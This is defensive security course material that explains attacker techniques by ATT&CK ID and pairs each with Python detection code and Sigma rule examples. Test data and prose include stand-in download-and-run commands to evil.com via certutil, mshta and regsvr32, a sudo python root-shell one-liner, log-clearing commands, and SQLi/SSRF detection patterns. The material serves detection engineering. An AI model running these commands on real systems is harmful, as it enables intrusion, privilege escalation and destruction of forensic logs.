Concept 1 — Passive vs Active Reconnaissance

Reconnaissance is the attacker's first step: gather information without getting caught. Passive recon means querying public sources — DNS records, LinkedIn org charts, GitHub repos, certificate transparency logs, Shodan scans — without touching the target's infrastructure. The target cannot log your activity. Active recon means probing directly: Nmap scans, banner grabbing, directory bruteforce. This generates log entries and firewall alerts.

From a defender's perspective this is like auditing your own data warehouse's public footprint. Passive recon is an attacker reading your open API documentation. Active recon is an attacker running SHOW TABLES against a misconfigured endpoint you forgot was public.

ATT&CK coverage: T1590 (Gather Victim Network Info), T1591 (Gather Victim Org Info), T1596 (Search Open Technical Databases), T1595 (Active Scanning).

Example:

import subprocess

    # In a real engagement: requests.get(f"https://crt.sh/?q={domain}&output=json")
    # Simulated result:

        f"mail.{domain}", f"vpn.{domain}", f"dev.{domain}",
        f"staging.{domain}", f"api.{domain}"

        "source": "certificate_transparency",
        "data": subdomains_from_ct,

Concept 2 — Phishing and Spearphishing (T1566)


Phishing is the dominant initial access vector across all threat actor groups. Standard phishing uses mass email with malicious attachments or links. Spearphishing (T1566.001 — attachment, T1566.002 — link) is targeted: the attacker customizes the lure based on passive recon. A message to a finance employee referencing a real vendor invoice is far more effective than a generic bank alert.


In data engineering terms: phishing is like a SQL injection payload designed specifically for your schema — the attacker already knows your table names and crafts the query accordingly.


Defender's view: you cannot stop all phishing at the network perimeter. You detect it through email gateway logs (suspicious sender domains, lookalike domains, attachment hash reputation), endpoint logs (document spawning child process — Office → cmd.exe is a classic chain), and user reports.


Example:


import re
from datetime import datetime

PHISHING_INDICATORS = {
    "lookalike_domains": re.compile(
        r"(micros0ft|micosoft|paypa1|g00gle|linkedln|arnazon)\.com"
    ),
    "suspicious_attachments": re.compile(
        r"\.(exe|vbs|js|hta|bat|ps1|lnk|iso|img)$", re.IGNORECASE
    ),
    "office_macros": re.compile(
        r"\.(doc|xls|ppt)m$", re.IGNORECASE
    ),
    "credential_keywords": re.compile(
        r"(password|verify.{0,20}account|suspended|urgent.{0,30}action)",
        re.IGNORECASE
    ),
}

def score_email(subject: str, sender: str, attachment: str) -> dict:
    score = 0
    hits = []
    if PHISHING_INDICATORS["lookalike_domains"].search(sender):
        score += 40
        hits.append("lookalike_domain")
    if attachment and PHISHING_INDICATORS["suspicious_attachments"].search(attachment):
        score += 35
        hits.append("suspicious_attachment")
    if attachment and PHISHING_INDICATORS["office_macros"].search(attachment):
        score += 25
        hits.append("macro_enabled_office")
    if PHISHING_INDICATORS["credential_keywords"].search(subject):
        score += 20
        hits.append("credential_lure_subject")
    return {
        "score": min(score, 100),
        "verdict": "block" if score >= 50 else "quarantine" if score >= 25 else "allow",
        "indicators": hits,
    }

samples = [
    ("Your account has been suspended - urgent action required",
     "support@micros0ft.com", "invoice.xlsm"),
    ("Q3 budget review", "cfo@company.com", "budget_q3.xlsx"),
    ("Please verify your password", "it@corp-helpdesk.net", "reset_form.hta"),
]

for subject, sender, attachment in samples:
    print(score_email(subject, sender, attachment))

Concept 3 — Exploitation Basics: Public-Facing Applications (T1190)


Exploitation of public-facing applications means finding and abusing vulnerabilities in internet-exposed services: web servers, VPNs, exchange servers, firewalls. The attacker sends a crafted payload that causes the application to execute unintended code or expose data. Common classes: SQLi (T1190 via web app), CVE-based RCE (specific version vulnerabilities), deserialization flaws, SSRF.


Think of SSRF as an attacker tricking your ETL pipeline's HTTP fetch step into making requests to internal services — your pipeline becomes a proxy from the internet to your internal network.


From a detection standpoint, you look for: 400/500-class HTTP error spikes, unusual user-agent strings, large POST bodies to unexpected endpoints, SQL keywords in URI parameters, and outbound connections from application servers that should not be making external calls.


Example:


import re
from collections import Counter

SQL_PATTERNS = re.compile(
    r"(union\s+select|or\s+'1'='1|--|;DROP|WAITFOR\s+DELAY|1=1)",
    re.IGNORECASE
)
SSRF_PATTERNS = re.compile(
    r"(169\.254\.|127\.0\.0\.|10\.\d+\.\d+\.\d+|192\.168\.|file://|gopher://)",
    re.IGNORECASE
)

def classify_web_attacks(logs: list) -> list:
    alerts = []
    for entry in logs:
        uri = entry["uri"]
        if SQL_PATTERNS.search(uri):
            alerts.append({**entry, "alert": "SQLi attempt", "technique": "T1190"})
        elif SSRF_PATTERNS.search(uri):
            alerts.append({**entry, "alert": "SSRF attempt", "technique": "T1190"})
    return alerts

for alert in classify_web_attacks(WEB_LOGS):
    print(f"[{alert['technique']}] {alert['alert']} from {alert['src_ip']}: {alert['uri'][:60]}")

Concept 1 — Living-Off-the-Land Binaries (LOLBins)


LOLBins are legitimate Windows binaries that attackers abuse to execute malicious code without dropping a custom executable. Because these are signed Microsoft tools, they bypass application allowlisting and most AV scanners. The attacker "lives off the land" — uses what is already there.


Common LOLBins: certutil.exe (download files with -urlcache), mshta.exe (execute HTA scripts), regsvr32.exe (execute COM scriptlets via scrobj.dll), wmic.exe (spawn processes via wmic process call create), rundll32.exe (load and execute DLLs), bitsadmin.exe (download files via BITS).


This is the attacker equivalent of a data pipeline that achieves its goal by abusing built-in database functions rather than writing a stored procedure — harder to detect, harder to block.


Detection: monitor for these binaries executing with unusual parent processes or command-line arguments that include URLs, base64-encoded strings, or network paths.


Example:


import re

LOLBIN_RULES = {
    "certutil_download": {
        "process": "certutil.exe",
        "cmdline_pattern": re.compile(r"-urlcache|-decode|-encode", re.IGNORECASE),
        "technique": "T1105",
        "severity": "high",
    },
    "mshta_remote": {
        "process": "mshta.exe",
        "cmdline_pattern": re.compile(r"http[s]?://|\\\\[^\\]", re.IGNORECASE),
        "technique": "T1218.005",
        "severity": "high",
    },
    "regsvr32_scrobj": {
        "process": "regsvr32.exe",
        "cmdline_pattern": re.compile(r"scrobj\.dll|/s\s+/n\s+/u", re.IGNORECASE),
        "technique": "T1218.010",
        "severity": "high",
    },
    "wmic_spawn": {
        "process": "wmic.exe",
        "cmdline_pattern": re.compile(r"process\s+call\s+create", re.IGNORECASE),
        "technique": "T1047",
        "severity": "high",
    },
    "bitsadmin_transfer": {
        "process": "bitsadmin.exe",
        "cmdline_pattern": re.compile(r"/transfer|/addfile|/resume", re.IGNORECASE),
        "technique": "T1197",
        "severity": "medium",
    },
}

def detect_lolbin(process_name: str, cmdline: str) -> dict | None:
    pname = process_name.lower()
    for rule_name, rule in LOLBIN_RULES.items():
        if rule["process"].lower() in pname:
            if rule["cmdline_pattern"].search(cmdline):
                return {
                    "rule": rule_name,
                    "technique": rule["technique"],
                    "severity": rule["severity"],
                    "process": process_name,
                    "cmdline": cmdline,
                }
    return None

test_events = [
    ("certutil.exe", "certutil -urlcache -split -f http://evil.com/beacon.exe C:\\Windows\\Temp\\b.exe"),
    ("mshta.exe", "mshta.exe http://192.168.1.100/payload.hta"),
    ("notepad.exe", "notepad.exe C:\\readme.txt"),
    ("regsvr32.exe", "/s /n /u /i:http://evil.com/file.sct scrobj.dll"),
]

for proc, cmd in test_events:
    result = detect_lolbin(proc, cmd)
    if result:
        print(f"[{result['severity'].upper()}] {result['rule']} → {result['technique']}")
    else:
        print("clean")

Concept 2 — Persistence Mechanisms: Scheduled Tasks and Services (T1053, T1543)


An attacker who gets initial access needs to survive reboots. The two most common persistence mechanisms on Windows are scheduled tasks and malicious services. A scheduled task can run on logon, system startup, or at a fixed interval. A malicious service auto-starts with Windows and runs under SYSTEM context if the attacker can create it with sufficient privilege.


These are the attacker equivalent of a cron job or a daemon in your data platform — a scheduled task is just cron, a malicious service is just systemd running the wrong binary.


Windows Event Log coverage: EID 4698 (scheduled task created), EID 4702 (task updated), EID 4699 (task deleted). Sysmon EID 11 (file created) + EID 1 (process created by schtasks.exe). For services: EID 7045 (new service installed), EID 7040 (service start type changed).


Example:


# Simulated parsed Windows event log entries
EVENTS = [
    {"eid": 4698, "time": "2024-04-10T02:00:00", "user": "SYSTEM",
     "task_name": "\\Microsoft\\Windows\\UpdateCheck",
     "task_content": "<Command>C:\\Windows\\Temp\\update.exe</Command>"},
    {"eid": 4698, "time": "2024-04-10T02:01:00", "user": "bob",
     "task_name": "\\Microsoft\\Windows\\WindowsUpdate",
     "task_content": "<Command>C:\\Windows\\System32\\wuauclt.exe</Command>"},
    {"eid": 7045, "time": "2024-04-10T02:02:00", "user": "SYSTEM",
     "service_name": "WindowsDefenderUpdate",
     "service_path": "C:\\ProgramData\\svchost.exe -k netsvcs"},
]

SUSPICIOUS_PATHS = re.compile(
    r"(\\Temp\\|\\AppData\\|\\ProgramData\\|\\Users\\Public\\)",
    re.IGNORECASE
)
MASQUERADE_NAMES = re.compile(
    r"(WindowsUpdate|Defender|MicrosoftEdge|OneDrive|Svchost)",
    re.IGNORECASE
)

def analyze_persistence_event(event: dict) -> dict | None:
    alerts = []
    content = event.get("task_content", "") + event.get("service_path", "")

    if SUSPICIOUS_PATHS.search(content):
        alerts.append("binary_in_suspicious_path")
    if event.get("task_name") and MASQUERADE_NAMES.search(event["task_name"]):
        # Check if it's the real path or impersonating
        if SUSPICIOUS_PATHS.search(content):
            alerts.append("masquerading_as_legitimate_name")
    if event.get("service_name") and MASQUERADE_NAMES.search(event["service_name"]):
        if SUSPICIOUS_PATHS.search(content):
            alerts.append("service_name_masquerade")

    if alerts:
        return {"eid": event["eid"], "time": event["time"], "alerts": alerts,
                "technique": "T1053.005" if event["eid"] in (4698, 4702) else "T1543.003"}
    return None

for event in EVENTS:
    result = analyze_persistence_event(event)
    if result:
        print(f"[ALERT] EID {result['eid']} {result['technique']}: {result['alerts']}")
    else:
        print(f"[clean] EID {event['eid']}")

Concept 3 — Fileless Malware and Memory-Only Execution


Fileless malware never writes a persistent binary to disk. It lives entirely in memory: PowerShell script blocks, reflective DLL injection, process hollowing (spawn a legitimate process suspended, overwrite its memory with malicious code, resume). This defeats file-based AV and forensic disk imaging — if the machine reboots, evidence is gone.


Detection requires memory telemetry: Sysmon EID 8 (CreateRemoteThread), EID 10 (ProcessAccess with suspicious GrantedAccess), Windows Defender ATP process memory scanning, or EDR products. PowerShell Script Block Logging (EID 4104) captures code executed in memory even if never written to disk.


Think of it like a query that runs entirely in memory with no temp table writes — you cannot find the query plan in any file, only in pg_stat_activity or an active trace.


Example:


# Sysmon EID 10 (ProcessAccess) — lsass.exe access with suspicious GrantedAccess mask
LSASS_ACCESS_EVENTS = [
    {"eid": 10, "time": "2024-04-10T03:00:00",
     "source_process": "mimikatz.exe", "target_process": "lsass.exe",
     "granted_access": "0x1fffff"},
    {"eid": 10, "time": "2024-04-10T03:01:00",
     "source_process": "MsMpEng.exe", "target_process": "lsass.exe",
     "granted_access": "0x1000"},
    {"eid": 10, "time": "2024-04-10T03:02:00",
     "source_process": "svchost.exe", "target_process": "lsass.exe",
     "granted_access": "0x1410"},
]

# GrantedAccess masks that indicate credential dumping
CREDENTIAL_DUMP_MASKS = {
    "0x1fffff": "PROCESS_ALL_ACCESS",
    "0x1410": "PROCESS_VM_READ + PROCESS_QUERY_INFORMATION",
    "0x1010": "PROCESS_VM_READ + PROCESS_QUERY_LIMITED_INFORMATION",
}

# Processes that legitimately access lsass
LSASS_LEGITIMATE_CALLERS = {
    "MsMpEng.exe", "csrss.exe", "wininit.exe",
    "services.exe", "lsass.exe", "svchost.exe"
}

def detect_lsass_access(event: dict) -> dict | None:
    if "lsass.exe" not in event.get("target_process", "").lower():
        return None
    access = event.get("granted_access", "").lower()
    source = event.get("source_process", "")

    is_suspicious_access = access in [k.lower() for k in CREDENTIAL_DUMP_MASKS]
    is_unknown_caller = source not in LSASS_LEGITIMATE_CALLERS

    if is_suspicious_access and is_unknown_caller:
        return {
            "alert": "credential_dump_attempt",
            "technique": "T1003.001",
            "source_process": source,
            "access_type": CREDENTIAL_DUMP_MASKS.get(access, "unknown"),
        }
    return None

for event in LSASS_ACCESS_EVENTS:
    result = detect_lsass_access(event)
    if result:
        print(f"[ALERT] {result['technique']}: {result['source_process']} → {result['access_type']}")
    else:
        print(f"[clean] {event['source_process']} accessed lsass normally")

Concept 1 — Windows Privilege Escalation: Token Impersonation and UAC Bypass


Privilege escalation is the attacker moving from a limited user account to SYSTEM or Domain Admin. On Windows, two common paths: token impersonation and UAC bypass.


Token impersonation: Windows uses access tokens to represent a user's security context. Processes running as SYSTEM (like IIS w3wp.exe or SQL Server) hold high-privilege tokens. If an attacker can inject into or call ImpersonateLoggedOnUser against such a process, they steal that token. The SeImpersonatePrivilege right is the enabling condition — IIS application pool accounts have this by default, which is why web shell → SYSTEM is a classic escalation path (Potato attacks exploit this).


UAC bypass: UAC is the Windows prompt that asks "do you want to allow this app to make changes?" Some COM objects and executables are auto-elevated (they have autoElevate: true in their manifest) and are not checked by UAC. If an attacker can hijack the DLL load order or registry key that one of these processes reads, code runs elevated with no prompt.


Example:

Concept 2 — Linux Privilege Escalation: SUID Binaries and Sudo Misconfigurations


On Linux, privilege escalation often exploits SUID binaries or sudo misconfigurations. A SUID binary runs with the file owner's permissions regardless of who calls it — if root owns it, it runs as root. Attackers find SUID binaries that allow arbitrary code execution (bash, vim, python, find, nmap) on GTFOBins.


sudo misconfigurations: a sudoers entry like alice ALL=(ALL) NOPASSWD: /usr/bin/python3 lets alice run python3 as root, which trivially escalates: sudo python3 -c "import os; os.system('/bin/bash')".


Detection: find / -perm -4000 -user root baseline on system build, alert on any new SUID file appearing. Monitor /var/log/auth.log for sudo sessions where the command is an interpreter or text editor.

Concept 3 — Defense Evasion: Obfuscation and Log Clearing


Once an attacker has elevated privileges, they try to avoid detection and cover their tracks. Two primary techniques: obfuscation (making malicious code harder to signature-detect) and log clearing (destroying forensic evidence).


Obfuscation on Windows: PowerShell Invoke-Expression with backtick insertion (IEX), string concatenation ("power"+"shell"), char-code concatenation ([char]73+[char]69+[char]88), -EncodedCommand. These all bypass signature-based detection while executing the same code.


Log clearing: Windows wevtutil cl Security (EID 1102 — audit log cleared), Linux echo > /var/log/auth.log or shred -u /var/log/auth.log. Alert: EID 1102 is itself logged when the Security log is cleared, giving you one event as evidence.


Example:


import re

# PowerShell obfuscation deobfuscator (simplified)
def deobfuscate_powershell(cmdline: str) -> str:
    """Strip common PowerShell obfuscation layers to reveal intent."""
    result = cmdline

    # Remove backtick insertions: I`E`X → IEX
    result = re.sub(r"`(.)", r"\1", result)

    # Decode -EncodedCommand if present
    enc_match = re.search(r"-[Ee]nc(?:odedCommand)?\s+([A-Za-z0-9+/=]+)", result)
    if enc_match:
        import base64
        try:
            decoded = base64.b64decode(enc_match.group(1)).decode("utf-16-le", errors="ignore")
            result = result[:enc_match.start()] + decoded
        except Exception:
            pass

    # Collapse obvious string concatenation: "pow"+"er" → "power"
    result = re.sub(r'"([^"]+)"\s*\+\s*"([^"]+)"', lambda m: f'"{m.group(1)}{m.group(2)}"', result)

    return result

DANGEROUS_KEYWORDS = re.compile(
    r"(IEX|Invoke-Expression|DownloadString|WebClient|Net\.WebClient"
    r"|AmsiUtils|amsiInitFailed|Bypass|unrestricted|Hidden|NoProfile)",
    re.IGNORECASE
)

Concept 1 — Lateral Movement: Pass-the-Hash and Remote Services


After escalating privileges, the attacker moves laterally — compromising other hosts on the network. Pass-the-Hash (PtH) uses a stolen NTLM hash instead of a cleartext password to authenticate to remote hosts. Because Windows NTLM authentication only verifies the hash, you do not need to crack it.


Remote services used for lateral movement: PsExec (creates a service on the target via SMB, runs commands as SYSTEM), WMI (wmic /node:target process call create "cmd.exe"), PowerShell Remoting (WinRM port 5985/5986), and DCOM.


Detection: Event 4648 (explicit credential logon — using credentials other than current session), EID 4624 Type 3 (network logon) from unexpected source IPs, SMB named pipe creation (Sysmon EID 18 for PSEXESVC), network connection from management binaries (psexec.exe, wmic.exe).

def detect_lateral_movement_pth(events: list, time_window_seconds: int = 60,
                                  host_threshold: int = 3) -> list:
    """Flag: same user + NTLM + multiple destination hosts in a short window."""
    sessions = defaultdict(list)
    for event in events:
        if event.get("logon_type") == 3 and event.get("auth_package") == "NTLM":
            key = (event["user"], event["src_ip"])
            sessions[key].append({
                "time": datetime.fromisoformat(event["time"]),
                "dest": event["dest_host"],
            })

    alerts = []
    for (user, src_ip), sessions_list in sessions.items():
        sessions_list.sort(key=lambda x: x["time"])
        first = sessions_list[0]["time"]
        last = sessions_list[-1]["time"]
        span = (last - first).total_seconds()
        if len(sessions_list) >= host_threshold and span <= time_window_seconds:
            alerts.append({
                "technique": "T1550.002",
                "alert": "pass_the_hash_lateral_movement",
                "user": user,
                "src_ip": src_ip,
                "hosts_accessed": [s["dest"] for s in sessions_list],
                "span_seconds": span,
            })
    return alerts

for alert in detect_lateral_movement_pth(NETWORK_LOGONS):
    print(f"[{alert['technique']}] {alert['user']} from {alert['src_ip']} → {alert['hosts_accessed']}")

Concept 2 — Credential Access: Kerberoasting and DCSync


Two advanced credential attacks that work against Active Directory without requiring admin rights at the starting point.


Kerberoasting: any authenticated domain user can request a Kerberos service ticket (TGS) for any Service Principal Name (SPN). The TGS is encrypted with the service account's NTLM hash. The attacker requests tickets for all SPNs, takes them offline, and cracks with hashcat. High-value targets: SQL service accounts, IIS app pool accounts, backup service accounts — these often have weak passwords and never expire.


DCSync: the attacker impersonates a Domain Controller's replication request using the DS-Replication-Get-Changes-All permission. This causes a real DC to send all password hashes — equivalent to running ntdsutil without physical access to the DC. Requires DA or Account Operators privileges (or delegated replication rights). Detection: EID 4662 (object operation on directory — AD) with specific GUIDs that indicate replication rights.

Concept 3 — Data Collection and Exfiltration (T1074, T1041)


After achieving objectives, the attacker collects and exfiltrates data. Collection: staging data in a local directory or volume shadow copy, using net use to access file shares, querying databases directly. def detect_dns_tunneling(events: list,
                          subdomain_length_threshold: int = 30,
                          frequency_threshold: int = 2) -> list:
    """Flag: long subdomains (possible encoded data) + high query frequency to same domain."""
    domain_queries = defaultdict(list)
    alerts = []

    for event in events:
        query = event["query"]
        parts = query.split(".")
        if len(parts) >= 2:
            subdomain = ".".join(parts[:-2])
            base_domain = ".".join(parts[-2:])
        else:
            continue

        if len(subdomain) >= subdomain_length_threshold:
            domain_queries[base_domain].append({
                "src_ip": event["src_ip"],
                "full_query": query,
                "subdomain_len": len(subdomain),
            })

    for domain, queries in domain_queries.items():
        if len(queries) >= frequency_threshold:
            total_bytes = sum(q["subdomain_len"] for q in queries)
            alerts.append({
                "technique": "T1071.004",
                "alert": "dns_tunneling",
                "c2_domain": domain,
                "query_count": len(queries),
                "estimated_bytes_exfiltrated": total_bytes,
            })
    return alerts

Concept 1 — Sigma Rule Anatomy and Metadata Standards


A Sigma rule is a vendor-neutral YAML detection that compiles to KQL, SPL, ES Query, SQL, and others via the sigma-cli tool. Every Sigma rule has a fixed schema: identification fields, metadata, log source specification, detection logic, and response fields. The detection logic uses a combination of keyword lists and field-value conditions joined by logical operators.


This is the equivalent of a dbt model — write once, generate platform-specific SQL for any target. A Sigma rule generates target-specific SIEM queries just as dbt generates target-specific SQL.


Understanding the schema is critical before writing a single rule. Key sections: title, id (UUID), status (experimental/test/stable), author, date, logsource (product, category, service), detection (selection + condition), falsepositives, level (informational/low/medium/high/critical), tags (ATT&CK technique IDs).


Example:

import yaml
import uuid

def create_sigma_skeleton(
    title: str,
    description: str,
    logsource: dict,
    detection: dict,
    technique: str,
    level: str = "medium",
    author: str = "Detection Team",
) -> str:
    """Generate a valid Sigma rule YAML string."""
    rule = {
        "title": title,
        "id": str(uuid.uuid4()),
        "status": "experimental",
        "description": description,
        "author": author,
        "date": "2024-04-10",
        "logsource": logsource,
        "detection": detection,
        "falsepositives": ["Unknown"],
        "level": level,
        "tags": [
            f"attack.{technique.lower()}",
            f"attack.{technique.replace('.', '_').lower()}",
        ],
    }
    return yaml.dump(rule, default_flow_style=False, allow_unicode=True, sort_keys=False)

Concept 2 — Writing Detection Logic: Conditions and Modifiers


Sigma's detection logic uses named selections combined with Boolean conditions. Modifiers transform how values are matched: |contains (substring), |startswith, |endswith, |re (regex), |all (all values must match), |contains|all (all substrings must be present). Conditions combine selections: selection and not filter, selection1 or selection2, 1 of selection*.


The condition selection and not filter is the workhorse of detection engineering: select the suspicious pattern, then subtract known-good (benign admin tools, IT processes). Getting the filter right reduces false positives without creating blind spots.


Example:


# Demonstrate Sigma condition logic in Python (mirrors how sigma-cli processes rules)

def evaluate_sigma_detection(event: dict, rule: dict) -> bool:
    """
    Evaluate a simplified Sigma detection block against a single event.
    Supports: selection (field conditions), filter (exclusions), condition (and/not).
    """
    detection = rule["detection"]
    condition_str = detection["condition"]

    def check_selection(sel_name: str) -> bool:
        sel = detection.get(sel_name, {})
        for field_modifier, values in sel.items():
            field_parts = field_modifier.split("|")
            field = field_parts[0]
            modifiers = field_parts[1:] if len(field_parts) > 1 else []
            event_value = str(event.get(field, ""))

            if isinstance(values, str):
                values = [values]

            if "all" in modifiers:
                # all values must match
                if not all(v.lower() in event_value.lower() for v in values):
                    return False
            elif "endswith" in modifiers:
                if not any(event_value.lower().endswith(v.lower()) for v in values):
                    return False
            elif "contains" in modifiers:
                if not any(v.lower() in event_value.lower() for v in values):
                    return False
            else:
                if event_value not in (values if isinstance(values, list) else [values]):
                    return False
        return True

    # Parse simple conditions: "selection", "selection and not filter"
    if condition_str == "selection":
        return check_selection("selection")
    elif condition_str == "selection and not filter":
        return check_selection("selection") and not check_selection("filter")
    return False

rule = {
    "detection": {
        "selection": {
            "Image|endswith": ["\\powershell.exe"],
            "CommandLine|contains|all": ["-enc", "http"],
        },
        "filter": {
            "CommandLine|contains": ["WindowsUpdate"],
        },
        "condition": "selection and not filter",
    }
}

def write_sigma_rules(rules: list, output_dir: str) -> int:
    os.makedirs(output_dir, exist_ok=True)
    count = 0
    for rule in rules:
        filename = rule.pop("filename")
        filepath = os.path.join(output_dir, filename)
        with open(filepath, "w") as f:
            yaml.dump(rule, f, default_flow_style=False, allow_unicode=True, sort_keys=False)
        count += 1
        print(f"Wrote {filepath}")
    return count
